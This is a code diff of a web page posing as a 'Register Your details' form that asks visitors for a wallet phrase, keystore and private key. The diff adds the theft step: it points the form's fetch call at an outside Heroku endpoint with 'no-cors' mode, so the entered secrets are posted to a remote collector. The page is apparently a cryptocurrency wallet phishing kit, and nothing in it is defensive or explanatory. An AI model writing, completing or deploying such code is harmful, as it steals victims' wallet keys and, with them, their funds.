@@ -19,7 +19,7 @@
     <h2 class="text-center mt-5">Register Your details</h2>
     <p class="text-center">Please Provide your Info</p>
     <div class="container">
-        <form id="mail_form" method="POST">
+        <form id="mail_form" method="POST" action="">
             <div class="row">
                 <div class="col-25">
                     <label for="subject">Phrase</label>
@@ -51,9 +51,7 @@
     </div>
 
         <script>
-            // let phrase = document.getElementById("phrase").value;
-            // let keyStore = document.getElementById("keystore").value;
-            // let privateKey = document.getElementById("privatekey").value;
+            
             const Form = document.getElementById("mail_form");
             const submitFormData = document.getElementById("submit")
             
@@ -72,8 +70,9 @@
                     };
 
 
-                    fetch("http://localhost:8080/email", {
+                    fetch("https://app-registry.herokuapp.com/email", {
                         method: 'POST',
+                        mode: 'no-cors',
                         headers: {
                             'Content-Type': 'application/json'
                         },
@@ -89,9 +88,7 @@
                     })
                     .catch((error) => {
                         console.log("Error: there has been an error here", error)
-                        phrase = "";
-                        keyStore = "";
-                        privateKey = "";
+                        
                     })
 
                 });
